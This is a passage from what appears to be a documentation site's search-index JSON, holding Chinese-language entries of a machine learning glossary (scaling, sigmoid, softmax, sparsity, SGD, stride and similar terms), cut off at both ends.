Saver"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#193-scaling","text":"\u7279\u5f81\u5de5\u7a0b \u4e2d\u7684\u4e00\u79cd\u5e38\u7528\u505a\u6cd5\uff0c\u662f\u6307\u5bf9\u67d0\u4e2a\u7279\u5f81\u7684\u503c\u533a\u95f4\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u4e4b\u4e0e\u6570\u636e\u96c6\u4e2d\u5176\u4ed6\u7279\u5f81\u7684\u503c\u533a\u95f4\u4e00\u81f4\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u60a8\u5e0c\u671b\u6570\u636e\u96c6\u4e2d\u6240\u6709\u6d6e\u70b9\u7279\u5f81\u7684\u503c\u90fd\u4f4d\u4e8e 0 \u5230 1 \u533a\u95f4\u5185\uff0c\u5982\u679c\u67d0\u4e2a\u7279\u5f81\u7684\u503c\u4f4d\u4e8e 0 \u5230 500 \u533a\u95f4\u5185\uff0c\u60a8\u5c31\u53ef\u4ee5\u901a\u8fc7\u5c06\u6bcf\u4e2a\u503c\u9664\u4ee5 500 \u6765\u7f29\u653e\u8be5\u7279\u5f81\u3002 \u53e6\u8bf7\u53c2\u9605 \u6807\u51c6\u5316 \u3002","title":"19.3. \u7f29\u653e (scaling)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#194-scikit-learn","text":"\u4e00\u4e2a\u70ed\u95e8\u7684\u5f00\u653e\u6e90\u4ee3\u7801\u673a\u5668\u5b66\u4e60\u5e73\u53f0\u3002\u8bf7\u8bbf\u95ee www.scikit-learn.org \u3002","title":"19.4. scikit-learn"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#195-semi-supervised-learning","text":"\u8bad\u7ec3\u6a21\u578b\u65f6\u91c7\u7528\u7684\u6570\u636e\u4e2d\uff0c\u67d0\u4e9b\u8bad\u7ec3\u6837\u672c\u6709\u6807\u7b7e\uff0c\u800c\u5176\u4ed6\u6837\u672c\u5219\u6ca1\u6709\u6807\u7b7e\u3002\u534a\u76d1\u7763\u5f0f\u5b66\u4e60\u91c7\u7528\u7684\u4e00\u79cd\u6280\u672f\u662f\u63a8\u65ad\u65e0\u6807\u7b7e\u6837\u672c\u7684\u6807\u7b7e\uff0c\u7136\u540e\u4f7f\u7528\u63a8\u65ad\u51fa\u7684\u6807\u7b7e\u8fdb\u884c\u8bad\u7ec3\uff0c\u4ee5\u521b\u5efa\u65b0\u6a21\u578b\u3002\u5982\u679c\u83b7\u5f97\u6709\u6807\u7b7e\u6837\u672c\u9700\u8981\u9ad8\u6602\u7684\u6210\u672c\uff0c\u800c\u65e0\u6807\u7b7e\u6837\u672c\u5219\u6709\u5f88\u591a\uff0c\u90a3\u4e48\u534a\u76d1\u7763\u5f0f\u5b66\u4e60\u5c06\u975e\u5e38\u6709\u7528\u3002","title":"19.5. \u534a\u76d1\u7763\u5f0f\u5b66\u4e60 (semi-supervised learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#196-sequence-model","text":"\u4e00\u79cd\u6a21\u578b\uff0c\u5176\u8f93\u5165\u5177\u6709\u5e8f\u5217\u4f9d\u8d56\u6027\u3002\u4f8b\u5982\uff0c\u6839\u636e\u4e4b\u524d\u89c2\u770b\u8fc7\u7684\u4e00\u7cfb\u5217\u89c6\u9891\u5bf9\u89c2\u770b\u7684\u4e0b\u4e00\u4e2a\u89c6\u9891\u8fdb\u884c\u9884\u6d4b\u3002","title":"19.6. \u5e8f\u5217\u6a21\u578b (sequence model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#197-tfsession","text":"\u5c01\u88c5\u4e86 TensorFlow \u8fd0\u884c\u65f6\u72b6\u6001\u7684\u5bf9\u8c61\uff0c\u7528\u4e8e\u8fd0\u884c\u5168\u90e8\u6216\u90e8\u5206 \u56fe \u3002\u5728\u4f7f\u7528\u5e95\u5c42 TensorFlow API \u65f6\uff0c\u60a8\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u5e76\u7ba1\u7406\u4e00\u4e2a\u6216\u591a\u4e2a tf.session \u5bf9\u8c61\u3002\u5728\u4f7f\u7528 Estimator API \u65f6\uff0cEstimator \u4f1a\u4e3a\u60a8\u521b\u5efa\u4f1a\u8bdd\u5bf9\u8c61\u3002","title":"19.7. \u4f1a\u8bdd (tf.session)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#198-s-sigmoid-function","text":"\u4e00\u79cd\u51fd\u6570\uff0c\u53ef\u5c06\u903b\u8f91\u56de\u5f52\u8f93\u51fa\u6216\u591a\u9879\u56de\u5f52\u8f93\u51fa\uff08\u5bf9\u6570\u51e0\u7387\uff09\u6620\u5c04\u5230\u6982\u7387\uff0c\u4ee5\u8fd4\u56de\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u503c\u3002S \u578b\u51fd\u6570\u7684\u516c\u5f0f\u5982\u4e0b\uff1a y = \\frac{1}{1 + e^{-\\sigma}} \u5728 \u903b\u8f91\u56de\u5f52 \u95ee\u9898\u4e2d\uff0c \u975e\u5e38\u7b80\u5355\uff1a \\sigma = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \u6362\u53e5\u8bdd\u8bf4\uff0cS \u578b\u51fd\u6570\u53ef\u5c06 \\sigma \u8f6c\u6362\u4e3a\u4ecb\u4e8e 0 \u5230 1 \u4e4b\u95f4\u7684\u6982\u7387\u3002 \u5728\u67d0\u4e9b \u795e\u7ecf\u7f51\u7edc \u4e2d\uff0cS \u578b\u51fd\u6570\u53ef\u4f5c\u4e3a \u6fc0\u6d3b\u51fd\u6570 \u4f7f\u7528\u3002","title":"19.8. S \u578b\u51fd\u6570 (sigmoid function)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#199-size-invariance","text":"\u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u7684\u5927\u5c0f\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5730\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u4e00\u53ea\u732b\u4ee5 200 \u4e07\u50cf\u7d20\u8fd8\u662f 20 \u4e07\u50cf\u7d20\u5448\u73b0\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u662f\u6700\u597d\u7684\u56fe\u50cf\u5206\u7c7b\u7b97\u6cd5\uff0c\u5728\u5927\u5c0f\u4e0d\u53d8\u6027\u65b9\u9762\u4ecd\u7136\u4f1a\u5b58\u5728\u5207\u5b9e\u7684\u9650\u5236\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4ec5\u4ee5 20 \u50cf\u7d20\u5448\u73b0\u7684\u732b\u56fe\u50cf\uff0c\u7b97\u6cd5\uff08\u6216\u4eba\uff09\u4e0d\u53ef\u80fd\u6b63\u786e\u5bf9\u5176\u8fdb\u884c\u5206\u7c7b\u3002 \u53e6\u8bf7\u53c2\u9605 \u5e73\u79fb\u4e0d\u53d8\u6027 \u548c \u65cb\u8f6c\u4e0d\u53d8\u6027 \u3002","title":"19.9. \u5927\u5c0f\u4e0d\u53d8\u6027 (size invariance)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1910-softmax","text":"\u4e00\u79cd\u51fd\u6570\uff0c\u53ef\u63d0\u4f9b \u591a\u7c7b\u522b\u5206\u7c7b\u6a21\u578b \u4e2d\u6bcf\u4e2a\u53ef\u80fd\u7c7b\u522b\u7684\u6982\u7387\u3002\u8fd9\u4e9b\u6982\u7387\u7684\u603b\u548c\u6b63\u597d\u4e3a 1.0\u3002\u4f8b\u5982\uff0csoftmax \u53ef\u80fd\u4f1a\u5f97\u51fa\u67d0\u4e2a\u56fe\u50cf\u662f\u72d7\u3001\u732b\u548c\u9a6c\u7684\u6982\u7387\u5206\u522b\u662f 0.9\u30010.08 \u548c 0.02\u3002\uff08\u4e5f\u79f0\u4e3a\u5b8c\u6574 softmax\u3002\uff09 \u4e0e \u5019\u9009\u91c7\u6837 \u76f8\u5bf9\u3002","title":"19.10. softmax"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1911-sparse-feature","text":"\u4e00\u79cd \u7279\u5f81 \u5411\u91cf\uff0c\u5176\u4e2d\u7684\u5927\u591a\u6570\u503c\u90fd\u4e3a 0 \u6216\u4e3a\u7a7a\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u5411\u91cf\u5305\u542b\u4e00\u4e2a\u4e3a 1 \u7684\u503c\u548c\u4e00\u767e\u4e07\u4e2a\u4e3a 0 \u7684\u503c\uff0c\u5219\u8be5\u5411\u91cf\u5c31\u5c5e\u4e8e\u7a00\u758f\u5411\u91cf\u3002\u518d\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u641c\u7d22\u67e5\u8be2\u4e2d\u7684\u5355\u8bcd\u4e5f\u53ef\u80fd\u5c5e\u4e8e\u7a00\u758f\u7279\u5f81 - \u5728\u67d0\u79cd\u6307\u5b9a\u8bed\u8a00\u4e2d\u6709\u5f88\u591a\u53ef\u80fd\u7684\u5355\u8bcd\uff0c\u4f46\u5728\u67d0\u4e2a\u6307\u5b9a\u7684\u67e5\u8be2\u4e2d\u4ec5\u5305\u542b\u5176\u4e2d\u51e0\u4e2a\u3002 \u4e0e \u5bc6\u96c6\u7279\u5f81 \u76f8\u5bf9\u3002","title":"19.11. \u7a00\u758f\u7279\u5f81 (sparse feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1912-sparse-representation","text":"\u4e00\u79cd\u5f20\u91cf \u8868\u793a\u6cd5 \uff0c\u4ec5\u5b58\u50a8\u975e\u96f6\u5143\u7d20\u3002 \u4f8b\u5982\uff0c\u82f1\u8bed\u4e2d\u5305\u542b\u7ea6\u4e00\u767e\u4e07\u4e2a\u5355\u8bcd\u3002\u8868\u793a\u4e00\u4e2a\u82f1\u8bed\u53e5\u5b50\u4e2d\u6240\u7528\u5355\u8bcd\u7684\u6570\u91cf\uff0c\u8003\u8651\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a \u8981\u91c7\u7528\u5bc6\u96c6\u8868\u793a\u6cd5\u6765\u8868\u793a\u6b64\u53e5\u5b50\uff0c\u5219\u5fc5\u987b\u4e3a\u6240\u6709\u4e00\u767e\u4e07\u4e2a\u5355\u5143\u683c\u8bbe\u7f6e\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u5728\u5927\u90e8\u5206\u5355\u5143\u683c\u4e2d\u653e\u5165 0\uff0c\u5728\u5c11\u6570\u5355\u5143\u683c\u4e2d\u653e\u5165\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u6574\u6570\u3002 \u8981\u91c7\u7528\u7a00\u758f\u8868\u793a\u6cd5\u6765\u8868\u793a\u6b64\u53e5\u5b50\uff0c\u5219\u4ec5\u5b58\u50a8\u8c61\u5f81\u53e5\u5b50\u4e2d\u5b9e\u9645\u5b58\u5728\u7684\u5355\u8bcd\u7684\u5355\u5143\u683c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u53e5\u5b50\u53ea\u5305\u542b 20 \u4e2a\u72ec\u4e00\u65e0\u4e8c\u7684\u5355\u8bcd\uff0c\u90a3\u4e48\u8be5\u53e5\u5b50\u7684\u7a00\u758f\u8868\u793a\u6cd5\u5c06\u4ec5\u5728 20 \u4e2a\u5355\u5143\u683c\u4e2d\u5b58\u50a8\u4e00\u4e2a\u6574\u6570\u3002 \u4f8b\u5982\uff0c\u5047\u8bbe\u4ee5\u4e24\u79cd\u65b9\u5f0f\u6765\u8868\u793a\u53e5\u5b50\"Dogs wag tails.\"\u3002\u5982\u4e0b\u8868\u6240\u793a\uff0c\u5bc6\u96c6\u8868\u793a\u6cd5\u5c06\u4f7f\u7528\u7ea6\u4e00\u767e\u4e07\u4e2a\u5355\u5143\u683c\uff1b\u7a00\u758f\u8868\u793a\u6cd5\u5219\u53ea\u4f7f\u7528 3 \u4e2a\u5355\u5143\u683c\uff1a \\text{\u5bc6\u96c6\u8868\u793a\u6cd5} \u5355\u5143\u683c\u7f16\u53f7 \u5355\u8bcd \u51fa\u73b0\u6b21\u6570 0 a 0 1 aardvark 0 2 aargh 0 3 aarti 0 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684\u53e6\u5916 140391 \u4e2a\u5355\u8bcd 140395 dogs 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684 633062 \u4e2a\u5355\u8bcd 773458 tails 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684 189136 \u4e2a\u5355\u8bcd 962594 wag 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684\u5f88\u591a\u5176\u4ed6\u5355\u8bcd \\text{\u7a00\u758f\u8868\u793a\u6cd5} \u5355\u5143\u683c\u7f16\u53f7 \u5355\u8bcd \u51fa\u73b0\u6b21\u6570 140395 dogs 1 773458 tails 1 962594 wag 1","title":"19.12. \u7a00\u758f\u8868\u793a\u6cd5 (sparse representation)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1913-sparsity","text":"\u5411\u91cf\u6216\u77e9\u9635\u4e2d\u8bbe\u7f6e\u4e3a 0\uff08\u6216\u7a7a\uff09\u7684\u5143\u7d20\u6570\u9664\u4ee5\u8be5\u5411\u91cf\u6216\u77e9\u9635\u4e2d\u7684\u6761\u76ee\u603b\u6570\u3002\u4ee5\u4e00\u4e2a 10x10 \u77e9\u9635\uff08\u5176\u4e2d 98 \u4e2a\u5355\u5143\u683c\u90fd\u5305\u542b 0\uff09\u4e3a\u4f8b\u3002\u7a00\u758f\u6027\u7684\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b\uff1a \\text{\u7a00\u758f\u6027} = \\frac{98}{100} = 0.98 \u7279\u5f81\u7a00\u758f\u6027\u662f\u6307\u7279\u5f81\u5411\u91cf\u7684\u7a00\u758f\u6027\uff1b\u6a21\u578b\u7a00\u758f\u6027\u662f\u6307\u6a21\u578b\u6743\u91cd\u7684\u7a00\u758f\u6027\u3002","title":"19.13. \u7a00\u758f\u6027 (sparsity)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1914-spatial-pooling","text":"\u8bf7\u53c2\u9605 \u6c60\u5316 \u3002","title":"19.14. \u7a7a\u95f4\u6c60\u5316 (spatial pooling)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1915-squared-hinge-loss","text":"\u5408\u9875\u635f\u5931\u51fd\u6570 \u7684\u5e73\u65b9\u3002\u4e0e\u5e38\u89c4\u5408\u9875\u635f\u5931\u51fd\u6570\u76f8\u6bd4\uff0c\u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u60e9\u7f5a\u66f4\u4e25\u5389\u3002","title":"19.15. \u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570 (squared hinge loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1916-squared-loss","text":"\u5728 \u7ebf\u6027\u56de\u5f52 \u4e2d\u4f7f\u7528\u7684 \u635f\u5931 \u51fd\u6570\uff08\u4e5f\u79f0\u4e3a L_2 \u635f\u5931\u51fd\u6570\uff09\u3002\u8be5\u51fd\u6570\u53ef\u8ba1\u7b97\u6a21\u578b\u4e3a\u6709\u6807\u7b7e \u6837\u672c \u9884\u6d4b\u7684\u503c\u548c \u6807\u7b7e \u7684\u5b9e\u9645\u503c\u4e4b\u5dee\u7684\u5e73\u65b9\u3002\u7531\u4e8e\u53d6\u5e73\u65b9\u503c\uff0c\u56e0\u6b64\u8be5\u635f\u5931\u51fd\u6570\u4f1a\u653e\u5927\u4e0d\u4f73\u9884\u6d4b\u7684\u5f71\u54cd\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0e L_1 \u635f\u5931\u51fd\u6570 \u76f8\u6bd4\uff0c\u5e73\u65b9\u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u53cd\u5e94\u66f4\u5f3a\u70c8\u3002","title":"19.16. \u5e73\u65b9\u635f\u5931\u51fd\u6570 (squared loss)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1917-static-model","text":"\u79bb\u7ebf\u8bad\u7ec3\u7684\u4e00\u79cd\u6a21\u578b\u3002","title":"19.17. \u9759\u6001\u6a21\u578b (static model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1918-stationarity","text":"\u6570\u636e\u96c6\u4e2d\u6570\u636e\u7684\u4e00\u79cd\u5c5e\u6027\uff0c\u8868\u793a\u6570\u636e\u5206\u5e03\u5728\u4e00\u4e2a\u6216\u591a\u4e2a\u7ef4\u5ea6\u4fdd\u6301\u4e0d\u53d8\u3002\u8fd9\u79cd\u7ef4\u5ea6\u6700\u5e38\u89c1\u7684\u662f\u65f6\u95f4\uff0c\u5373\u8868\u660e\u5e73\u7a33\u6027\u7684\u6570\u636e\u4e0d\u968f\u65f6\u95f4\u800c\u53d8\u5316\u3002\u4f8b\u5982\uff0c\u4ece 9 \u6708\u5230 12 \u6708\uff0c\u8868\u660e\u5e73\u7a33\u6027\u7684\u6570\u636e\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002","title":"19.18. \u5e73\u7a33\u6027 (stationarity)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1919-step","text":"\u5bf9\u4e00\u4e2a \u6279\u6b21 \u7684\u5411\u524d\u548c\u5411\u540e\u8bc4\u4f30\u3002","title":"19.19. \u6b65 (step)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1920-step-size","text":"\u4e0e \u5b66\u4e60\u901f\u7387 \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"19.20. \u6b65\u957f (step size)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1921-sgd-stochastic-gradient-descent","text":"\u6279\u6b21\u5927\u5c0f\u4e3a 1 \u7684\u4e00\u79cd \u68af\u5ea6\u4e0b\u964d\u6cd5 \u3002\u6362\u53e5\u8bdd\u8bf4\uff0cSGD \u4f9d\u8d56\u4e8e\u4ece\u6570\u636e\u96c6\u4e2d\u968f\u673a\u5747\u5300\u9009\u62e9\u7684\u5355\u4e2a\u6837\u672c\u6765\u8ba1\u7b97\u6bcf\u6b65\u7684\u68af\u5ea6\u4f30\u7b97\u503c\u3002","title":"19.21. \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, stochastic gradient descent)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1922-srm-structural-risk-minimization","text":"\u4e00\u79cd\u7b97\u6cd5\uff0c\u7528\u4e8e\u5e73\u8861\u4ee5\u4e0b\u4e24\u4e2a\u76ee\u6807\uff1a \u671f\u671b\u6784\u5efa\u6700\u5177\u9884\u6d4b\u6027\u7684\u6a21\u578b\uff08\u4f8b\u5982\u635f\u5931\u6700\u4f4e\uff09\u3002 \u671f\u671b\u4f7f\u6a21\u578b\u5c3d\u53ef\u80fd\u7b80\u5355\uff08\u4f8b\u5982\u5f3a\u5927\u7684\u6b63\u5219\u5316\uff09\u3002 \u4f8b\u5982\uff0c\u65e8\u5728\u5c06\u57fa\u4e8e\u8bad\u7ec3\u96c6\u7684\u635f\u5931\u548c\u6b63\u5219\u5316\u964d\u81f3\u6700\u4f4e\u7684\u51fd\u6570\u5c31\u662f\u4e00\u79cd\u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316\u7b97\u6cd5\u3002 \u5982\u9700\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://www.svms.org/srm/ \u3002 \u4e0e \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 \u76f8\u5bf9\u3002","title":"19.22. \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 (SRM, structural risk minimization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1923-stride","text":"\u5728\u5377\u79ef\u8fd0\u7b97\u6216\u6c60\u5316\u4e2d\uff0c\u4e0b\u4e00\u4e2a\u7cfb\u5217\u7684\u8f93\u5165\u5207\u7247\u7684\u6bcf\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u589e\u91cf\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u52a8\u753b\u6f14\u793a\u4e86\u5377\u79ef\u8fd0\u7b97\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a (1,1) \u6b65\u957f\u3002\u56e0\u6b64\uff0c\u4e0b\u4e00\u4e2a\u8f93\u5165\u5207\u7247\u662f\u4ece\u4e0a\u4e00\u4e2a\u8f93\u5165\u5207\u7247\u5411\u53f3\u79fb\u52a8\u4e00\u4e2a\u6b65\u957f\u7684\u4f4d\u7f6e\u5f00\u59cb\u3002\u5f53\u8fd0\u7b97\u5230\u8fbe\u53f3\u4fa7\u8fb9\u7f18\u65f6\uff0c\u4e0b\u4e00\u4e2a\u5207\u7247\u5c06\u56de\u5230\u6700\u5de6\u8fb9\uff0c\u4f46\u662f\u4e0b\u79fb\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u524d\u9762\u7684\u793a\u4f8b\u6f14\u793a\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6b65\u957f\u3002\u5982\u679c\u8f93\u5165\u77e9\u9635\u4e3a\u4e09\u7ef4\uff0c\u90a3\u4e48\u6b65\u957f\u4e5f\u5c06\u662f\u4e09\u7ef4\u3002","title":"19.23. \u6b65\u957f (stride)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1924-subsampling","text":"\u8bf7\u53c2\u9605 \u6c60\u5316 \u3002","title":"19.24. \u4e0b\u91c7\u6837 (subsampling)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1925-summary","text":"\u5728 TensorFlow \u4e2d\u7684\u67d0\u4e00 \u6b65 \u8ba1\u7b97\u51fa\u7684\u4e00\u4e2a\u503c\u6216\u4e00\u7ec4\u503c\uff0c\u901a\u5e38\u7528\u4e8e\u5728\u8bad\u7ec3\u671f\u95f4\u8ddf\u8e2a\u6a21\u578b\u6307\u6807\u3002","title":"19.25. \u603b\u7ed3 (summary)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1926-supervised-machine-learning","text":"\u6839\u636e\u8f93\u5165\u6570\u636e\u53ca\u5176\u5bf9\u5e94\u7684 \u6807\u7b7e \u6765\u8bad\u7ec3 \u6a21\u578b 